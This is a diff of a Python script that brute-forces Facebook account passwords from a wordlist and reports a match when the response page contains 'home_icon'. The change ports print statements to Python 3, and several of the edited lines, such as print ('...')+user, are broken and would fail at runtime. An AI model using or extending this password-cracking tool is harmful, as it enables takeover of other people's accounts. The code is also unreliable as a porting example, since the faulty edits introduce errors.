@@ -18,7 +18,7 @@ time.sleep(0.5)
 try:
     import mechanize
 except ModuleNotFoundError:
-    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
+    print ('[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2')
     exit()
 
 time.sleep(0.5)
@@ -32,10 +32,10 @@ except FileNotFoundError:
     exit()
 
 time.sleep(0.8)
-print '\n\nCracking '+user+' Now...'
+print ('\n\nCracking ')+user+' Now...'
 
 time.sleep(1)
-print '\nIM NOT RESPONSIBLE FOR ANY MISS USE XIDI\n'
+print ('\nIM NOT RESPONSIBLE FOR ANY MISS USE XIDI\n')
 for password in wordlist:
     if password == '' or password == ' ':
         pass
@@ -55,20 +55,20 @@ for password in wordlist:
             dos.seek(0)
             text = dos.read().decode('UTF-8')
             if text.find('home_icon', 0, len(text)) != -1:
-                print '[+] Password Found > '+password 
+                print ('[+] Password Found > ')+password 
                 dos.close()
                 os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                 exit()
             else:
-                print "[!] Wrong Password! > "+str(password)
+                print ("[!] Wrong Password! > ")+str(password)
         except KeyboardInterrupt:
-            print '\n#############################################\n   Exiting..'
+            print ('\n#############################################\n   Exiting..')
             dos.close()
             os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
             exit()
 
 time.sleep(1)
-print 'Sorry, none of the passswords in your wordlist is right.'
+print ('Sorry, none of the passswords in your wordlist is right.')
 time.sleep(0.8)
 dos.close()
 os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
